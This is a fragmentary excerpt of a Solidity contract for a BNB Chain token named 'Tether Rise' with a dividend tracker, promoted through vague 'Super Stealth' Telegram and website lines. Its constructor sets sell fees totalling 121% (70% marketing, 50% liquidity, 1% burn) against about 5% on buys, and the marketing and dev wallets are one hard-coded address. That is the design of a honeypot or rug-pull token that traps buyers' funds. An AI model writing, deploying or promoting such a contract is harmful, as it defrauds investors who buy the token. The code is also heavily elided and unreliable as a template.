...
/**
$$$$$$$$\ $$$$$$$$\ $$$$$$$$\ $$\   $$\ $$$$$$$$\ $$$$$$$\        $$$$$$$\  $$$$$$\  $$$$$$\  $$$$$$$$\ 
\__$$  __|$$  _____|\__$$  __|$$ |  $$ |$$  _____|$$  __$$\       $$  __$$\ \_$$  _|$$  __$$\ $$  _____|
   $$ |   $$ |         $$ |   $$ |  $$ |$$ |      $$ |  $$ |      $$ |  $$ |  $$ |  $$ /  \__|$$ |      
   $$ |   $$$$$\       $$ |   $$$$$$$$ |$$$$$\    $$$$$$$  |      $$$$$$$  |  $$ |  \$$$$$$\  $$$$$\    
   $$ |   $$  __|      $$ |   $$  __$$ |$$  __|   $$  __$$<       $$  __$$<   $$ |   \____$$\ $$  __|   
   $$ |   $$ |         $$ |   $$ |  $$ |$$ |      $$ |  $$ |      $$ |  $$ |  $$ |  $$\   $$ |$$ |      
   $$ |   $$$$$$$$\    $$ |   $$ |  $$ |$$$$$$$$\ $$ |  $$ |      $$ |  $$ |$$$$$$\ \$$$$$$  |$$$$$$$$\ 
   \__|   \________|   \__|   \__|  \__|\________|\__|  \__|      \__|  \__|\______| \______/ \________|
Telegram : Super Stealth, Find us!
Website : Super Stealth Find Our Website.
*/
...
contract TetherRise is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    TetherRiseDividendTracker public dividendTracker;
 ...
 constructor() ERC20("Tether Rise", "TRISE") {
        marketingWallet = payable(0x81c75f40d0E85F6f34e884caDf0E76BA45871996);
        devWallet = payable(0x81c75f40d0E85F6f34e884caDf0E76BA45871996);
        address router = 0x10ED43C718714eb63d5aA57B78B54704E256024E; // Mainnet

        buyDeadFees = 1;
        sellDeadFees = 1;
        buyMarketingFees = 4;
        sellMarketingFees = 70;
        buyLiquidityFee = 0;
        sellLiquidityFee = 50;
        buyRewardsFee = 0;
        sellRewardsFee = 0;
        ...
        dividendTracker = new TetherRiseDividendTracker(
            payable(this),
            router,
    ...
    // set Max Transfer Limit cannot be lower Then 0.05% Of supply
...
contract TetherRiseDividendTracker is DividendPayingToken, Ownable {
    using SafeMath for uint256;
    using SafeMathInt for int256;
    ...
    TetherRise public TetherRiseContract;
    ...
    constructor(
        ...
        defaultToken = token;
        TetherRiseContract = TetherRise(mainContract);
    ...
    function _transfer(
        ...
        require(false, "TetherRise_Dividend_Tracker: No transfers allowed");
    }

    function withdrawDividend() public pure override {
        require(
            false,
            "TetherRise_Dividend_Tracker: withdrawDividend disabled. Use the 'claim' function on the main TetherRise contract."
        );
    }
        ...
        returns (uint256)
    {
        ...
        if (_withdrawableDividend > 0) {
            ...
            path[1] = address(TetherRiseContract);

            uint256 prevBalance = TetherRiseContract.balanceOf(address(this));
            ...
            {
                uint256 received = TetherRiseContract
                    .balanceOf(address(this))
                    .sub(prevBalance);
                if (received > 0) {
                    success = true;
                    TetherRiseContract.transfer(account, received);
                } else {
                    success = false;
                }
            } catch {
